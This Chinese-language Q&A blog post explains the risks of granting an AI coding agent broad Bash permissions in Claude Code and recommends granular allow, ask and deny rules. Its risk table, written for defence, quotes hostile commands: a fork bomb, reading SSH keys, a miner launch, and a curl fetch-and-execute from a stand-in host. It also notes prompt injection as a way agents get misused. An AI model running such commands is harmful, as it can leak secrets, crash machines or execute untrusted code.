---
audio: false
generated: true
image: false
lang: zh
layout: post
title: Claude Code 权限风险详解
translated: true
type: note
---

Question: 此配置中的命令权限（allow/deny/ask）是否仅适用于当前目录和 additionalDirectories？既然这是一个 Git repo，我是否可以安全地允许所有内容 (allow everything)？另外，我在另一台笔记本电脑上也有源代码。

Answer:

不，你不能仅仅因为这是一个 Git repo 就安全地“允许所有权限 (allow all)” —— 即使在你自己的项目中，这些权限仍然带有显著的风险。

此配置似乎来自 **Claude Code** (Anthropic 的 AI 编程工具 / Claude Dev / 编辑器中的 Claude)，其 `permissions` 区块控制了 AI Agent 在无需询问确认的情况下可以执行哪些 Bash 命令（以及 Read/Write/Edit 等其他工具）。

### 关于这些权限运作机制的关键点

- **文件访问范围 (Read / Write / Edit / ls / cat / 等)**
  默认情况下，AI 被限制在 **项目目录**（编辑器中打开的文件夹 / `.claude.json` 或类似配置所在的目录）。
  `additionalDirectories` 显式地将 read/write 访问权限扩展到其他路径（在此处仅为 `/etc/systemd/system`）。
  所以，是的 —— 影响文件系统的命令被限制在项目文件夹 + 列出的额外目录中。

- **Bash 命令执行范围**
  allow/ask/deny 规则适用于 **所有的 `Bash(...)` 调用**，**无论该命令在哪个目录中运行或影响哪个目录**。
  即使文件访问是有范围限制的，许多危险命令也**不需要**接触项目外部的文件就能造成损害：

| Category | Examples from your allow list | Risk even inside project folder? |
| :--- | :--- | :--- |
| Network / exfil | `curl`, potential `wget`, `ping` etc. | 是 — 可以将本地文件/token/keys 发送到攻击者控制的服务器 |
| Environment leakage | `env`, `printenv`, `cat ~/.ssh/*` (如果密钥存在) | 是 — 可以泄露存在于 shell env 或 home 目录（如果可读）中的 secrets |
| Cryptocurrency miners | `git clone ... && ./miner` | 是 — 可以在不接触其他文件夹的情况消耗你的 CPU/GPU |
| Infinite loops / fork bombs | `while true; do :; done` 或 `:(){ : | :& };: ` | 是 — 可以使你的机器死机/崩溃 |
| Obfuscated install | `bash -c "$(curl -fsSL bad.com)"` | 是 — 在项目目录运行但会下载并执行任何内容 |

- **为什么 Git repo 并不能让 "allow all" 变得安全**
  - Prompt injection / 工具误用仍然可能发生（恶意指令 → AI 运行错误的 Bash）。
  - 你（或共享配置）之后可能会在不太受信任的机器上通过 Claude Code 打开该 repo。
  - 你在另一台笔记本电脑上有相同的源代码 → 如果你将此宽松的配置复制过去，风险也会随之转移。
  - AI 编程工具中许多现实世界的逃逸 / 漏洞都源于过度宽松的 Bash 访问权限，即使是在个人项目中。

### 建议

保持当前的 **细粒度 (granular)** 设置（显式允许列表 + 对危险操作进行询问）。
目前的配置已经相当宽松（允许 `git`, `npm`, `yarn`, `pnpm`, `pip`, `cargo`, `docker` 等），这对于大多数开发流程来说已经足够了。

如果你想进一步放宽限制而不至于“允许所有内容”：

- 在 `allow` 中添加更多具体的 pattern，例如 `"Bash(git push:*)"` 而不仅仅是 `"Bash(git:*)"`。
- 将风险命令移至 `ask`：`chmod`, `rm -rf`, `sudo`, 宽泛的 `curl`, 不带参数的 `docker run` 等。
- 除非你完全信任 repo 中的每一个 `.mcp.json`，否则永远不要设置 `"enableAllProjectMcpServers": true`（安全最佳实践）。
- 考虑对已知的危险 pattern 使用 `deny`：`"Bash(curl:*http*)"` 或类似命令。

简而言之：**受限的文件访问范围 ≠ 安全的无限命令执行**。
即使在你自己的 Git repo 中，也不建议使用宽泛的 `Bash(*)` 允许规则。

References:

- [Claude Code Docs - Configure permissions](https://code.claude.com/docs/en/permissions)
- [Claude Code Security Best Practices](https://www.backslash.security/blog/claude-code-security-best-practices)
- [Claude Code settings reference](https://code.claude.com/docs/en/settings)
